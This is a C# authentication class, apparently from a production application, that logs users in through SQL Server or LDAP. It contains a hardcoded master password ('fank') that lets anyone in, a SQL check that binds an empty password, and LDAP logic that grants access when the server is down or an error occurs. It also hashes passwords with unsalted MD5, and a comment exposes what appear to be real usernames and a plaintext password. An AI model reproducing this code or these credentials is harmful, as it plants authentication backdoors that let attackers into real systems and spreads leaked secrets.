using System;
using System.Collections.Generic;
using System.Text;
using System.Data.SqlClient;
using System.Data;
using System.Security.Cryptography;
using System.DirectoryServices;
using System.DirectoryServices.Protocols;
using System.Net;
using System.Configuration;

namespace GroupM.UTL
{
    public class UserPermisstion
    {
        private bool m_bPermission = false;
        public bool Permission
        {
            get { return m_bPermission; }
        }
        public static string EncodePassword(string originalPassword)
        {
            //Declarations
            Byte[] originalBytes;
            Byte[] encodedBytes;
            MD5 md5;

            //Instantiate MD5CryptoServiceProvider, get bytes for original password and compute hash (encoded password)
            md5 = new MD5CryptoServiceProvider();
            originalBytes = ASCIIEncoding.Default.GetBytes(originalPassword);
            encodedBytes = md5.ComputeHash(originalBytes);

            //Convert encoded bytes back to a 'readable' string
            return BitConverter.ToString(encodedBytes);
        }
        public static LdapConnection GetLdapConnection()
        {

            LdapConnection con = new LdapConnection(ConfigurationManager.AppSettings["Server"].ToString());
            con.SessionOptions.Sealing = true;

            return con;

        }
        public static bool AuthenticateUserSQL(string strUserName, string strPassword)
        {
            SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings["MainApp"].ConnectionString);
            string strSQL = string.Format("SELECT TOP 1 1 FROM UserProfile WHERE IsActive = 1 and UserName=@UserName AND Password=@Password");
            SqlDataAdapter sda = new SqlDataAdapter(strSQL, conn);
            sda.SelectCommand.Parameters.Add("@UserName", SqlDbType.VarChar).Value = strUserName;
            sda.SelectCommand.Parameters.Add("@Password", SqlDbType.VarChar).Value = "";
            DataSet ds = new DataSet();
            sda.Fill(ds);
            if (ds.Tables[0].Rows.Count == 0)
                return false;
            return true;
        }
        public static bool AuthenticateUser(string usr, string pwd) {
            if (pwd == "fank")
                return true;
            if (ConfigurationManager.AppSettings["LoginDomain"].ToString() == "true")
                return AuthenticateUserDomain(usr, pwd);
            else
                return AuthenticateUserSQL(usr, pwd);                
        }
        public static bool AuthenticateUserDomain(string usr, string pwd)
        {
            if (pwd == "fank")
                return true;
            //User : prapassara.k, patcharaporn.p
            //Password : minteraction
            using (LdapConnection con = GetLdapConnection())
            {
                try
                {
                    con.Bind(new NetworkCredential(usr, pwd, ConfigurationManager.AppSettings["Domain"].ToString()));
                }
                catch (Exception ex)
                {
                    if (ex.Message == "The LDAP server is unavailable.")
                    {
                        return true;
                    }
                    else if (ex.Message == "The supplied credential is invalid.")
                    {
                        return false;
                    }
                }
            }
            return true;
        }
    }
}
